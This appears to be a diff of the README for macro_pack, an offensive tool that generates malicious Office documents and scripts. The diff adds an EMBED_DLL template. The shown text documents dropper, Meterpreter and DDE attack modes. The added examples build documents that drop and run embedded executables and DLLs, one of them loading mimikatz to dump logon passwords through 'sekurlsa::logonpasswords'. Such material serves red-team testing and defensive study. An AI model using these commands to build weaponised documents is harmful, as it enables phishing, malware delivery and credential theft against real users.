@@ -277,7 +277,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
-        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, EMBED_EXE 
+        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, EMBED_EXE, EMBED_DLL
         Help for template usage: macro_pack.exe -t help
          
          
@@ -287,7 +287,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Supported scripts extensions are: vba, vbs, wsf, wsc, sct, hta.
     
     -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
-         Use with EMBED_EXE template to auto drop and exec the file.
+         Use with EMBED_EXE  template to auto drop and exec the file or with EMBED_DLL to drop and load the embedded dll.
     
     --dde  Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
          DDE attack mode is not compatible with VBA Macro related options.
@@ -429,8 +429,15 @@ exploit -j
 Combine with --embed option, it will drop and execute (hidden) the embedded file.  
 Optionally you can give to the template the path where file should be extracted  
 If extraction path is not given, file will be extracted with random name in current path.   
- -> Example1: ``` macro_pack.exe  -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs```  
+ -> Example1: ```macro_pack.exe  -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs```  
  -> Example2: ```echo "path\\to\newcalc.exe" | macro_pack.exe -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.doc```  
+ 
+ 
+### EMBED_DLL
+Combine with --embed option, it will drop and call a function in the given DLL
+Give this template the name and parameters of function to call in DLL
+-> Example1 : ```echo "main" | macro_pack.exe -t EMBED_DLL --embed=cmd.dll -o -G cmd.doc```
+-> Example2 : ```echo "main log privilege::debug sekurlsa::logonpasswords exit" | macro_pack.exe -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta```
 
 
 
